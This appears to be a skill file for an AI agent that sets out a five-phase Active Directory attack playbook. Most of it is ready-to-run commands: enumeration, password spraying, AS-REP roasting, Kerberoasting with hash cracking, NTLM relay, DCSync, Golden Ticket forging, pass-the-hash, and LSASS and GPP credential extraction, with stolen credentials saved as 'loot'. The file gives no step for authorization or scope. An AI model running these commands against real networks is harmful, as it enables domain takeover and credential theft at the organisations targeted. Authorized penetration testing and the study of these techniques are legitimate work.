---
name: active-directory-attack
description: Active Directory penetration testing — enumeration, Kerberoasting, AS-REP roasting, DCSync, Golden/Silver Ticket attacks, lateral movement
---

# Active Directory Attack Skill

Systematic Active Directory domain compromise methodology.

## Phase 1: AD Enumeration
1. Use `execute_command` to run `ldapsearch` or `rpcclient` for domain enumeration
2. Use `execute_command`: `nmap -p 88,135,139,389,445,636,3268,3269 -sV target`
3. Use `dns_recon` to enumerate DC hostnames via SRV records: `_kerberos._tcp.domain.com`
4. Use `execute_command`: `enum4linux -a target` for SMB/LDAP enumeration
5. Use `port_scanner` to map all Domain Controllers and their services

## Phase 2: User Enumeration
6. Use `execute_command`: `kerbrute userenum -d domain.local --dc DC_IP userlist.txt`
7. Use `execute_command`: `crackmapexec smb DC_IP -u '' -p '' --users` (null session)
8. Perform AS-REP Roasting: `execute_command`: `impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt`
9. Spray common passwords: `execute_command`: `crackmapexec smb DC_IP -u users.txt -p 'Password1'`

## Phase 3: Credential Attacks
10. Kerberoasting: `execute_command`: `impacket-GetUserSPNs domain.local/user:pass -request`
11. Crack TGS tickets: `execute_command`: `hashcat -m 13100 hashes.txt wordlist.txt`
12. AS-REP Roast: `execute_command`: `impacket-GetNPUsers domain.local/ -format hashcat`
13. Use `hash_crack` to identify and crack captured hashes
14. NTLM relay: `execute_command`: `impacket-ntlmrelayx -tf targets.txt -smb2support`

## Phase 4: Domain Compromise
15. DCSync attack: `execute_command`: `impacket-secretsdump domain.local/admin:pass@DC_IP`
16. Golden Ticket: `execute_command`: `impacket-ticketer -domain domain.local -domain-sid SID -nthash KRBTGT_HASH admin`
17. Silver Ticket for specific services
18. Pass-the-Hash: `execute_command`: `impacket-psexec -hashes LM:NT admin@target`

## Phase 5: Post-Exploitation & Persistence
19. Extract LSASS: `execute_command`: `crackmapexec smb targets -u admin -p pass --lsa`
20. GPP Passwords: `execute_command`: `impacket-Get-GPPPassword domain.local/user:pass@DC`
21. DPAPI secrets extraction
22. Store all credentials with `memory_store` action "store_loot"
23. Save full AD report with `save_artifact`
